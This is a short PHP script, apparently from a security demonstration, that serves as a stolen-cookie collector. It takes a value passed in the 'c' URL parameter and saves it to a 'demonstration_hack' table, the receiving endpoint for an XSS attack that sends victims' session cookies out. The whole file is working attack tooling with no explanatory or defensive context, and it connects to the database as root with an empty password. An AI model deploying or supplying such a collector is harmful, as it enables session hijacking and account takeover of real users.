<?php

$pdo = new \PDO('mysql:host=localhost;dbname=securite', 'root', '');

if(!empty($_GET['c']))
{
	$cookie = $pdo->quote($_GET['c']);
	$pdo->exec("INSERT INTO demonstration_hack VALUES(NULL, ".$cookie.")");
}

?>